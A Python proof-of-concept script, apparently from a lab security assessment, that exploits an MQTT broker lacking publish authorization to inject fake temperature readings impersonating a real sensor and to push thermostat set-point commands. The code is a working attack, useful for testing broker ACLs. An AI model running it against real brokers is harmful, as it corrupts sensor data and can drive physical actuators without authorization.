#!/usr/bin/env python3
"""
spoof_publish.py — PoC: unauthorized publishing / data & command injection (integrity).

Demonstrates that on a broker with no publish authorization an attacker can:
  1. Inject fake temperature readings (fooling a dashboard / automation), and
  2. Publish to an actuator command topic (e.g. tell the thermostat to change).

SCOPE: local lab broker you control only. This script targets the simulated
devices in this repository. It is part of a self-contained security assessment.

Finding this maps to: VULN-02 (Missing publish authorization / no topic ACL).

Usage:
    python src/attacks/spoof_publish.py                  # inject a fake reading
    python src/attacks/spoof_publish.py --command 30     # push thermostat set=30C
"""

import argparse
import json
import os
import sys
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import (  # noqa: E402
    mqtt_settings, apply_client_security, describe,
    TOPIC_TEMPERATURE, TOPIC_COMMAND,
)


def main() -> int:
    ap = argparse.ArgumentParser(description="MQTT unauthorized publish PoC (local lab only)")
    ap.add_argument("--value", type=float, default=99.9,
                    help="fake temperature value to inject")
    ap.add_argument("--command", type=float, default=None,
                    help="if set, publish a thermostat set-point command instead")
    args = ap.parse_args()

    settings = mqtt_settings()
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="attacker-injector")
    apply_client_security(client, settings)

    print(f"[spoof] target {describe(settings)}")
    try:
        client.connect(settings["host"], settings["port"], keepalive=30)
    except Exception as exc:  # noqa: BLE001
        print(f"[spoof] could not connect: {exc}")
        return 1
    client.loop_start()

    if args.command is not None:
        topic = TOPIC_COMMAND
        payload = json.dumps({
            "device_id": "SPOOFED",
            "set_point_c": args.command,
            "ts": datetime.now(timezone.utc).isoformat(),
        })
        label = "ACTUATOR COMMAND"
    else:
        topic = TOPIC_TEMPERATURE
        payload = json.dumps({
            "device_id": "temp-sensor-01",   # impersonating the real device id
            "type": "temperature",
            "unit": "C",
            "value": args.value,
            "battery": 100,
            "ts": datetime.now(timezone.utc).isoformat(),
            "_injected": True,
        })
        label = "FAKE SENSOR READING"

    info = client.publish(topic, payload, qos=1, retain=True)
    info.wait_for_publish(timeout=5)
    client.loop_stop()
    client.disconnect()

    if info.rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"[spoof] published {label} to '{topic}': {payload}")
        print("[spoof] RESULT: integrity broken — broker accepted an unauthorized publish")
    else:
        print(f"[spoof] publish failed rc={info.rc}")
        print("[spoof] RESULT: publish rejected — topic authorization appears enforced (good)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
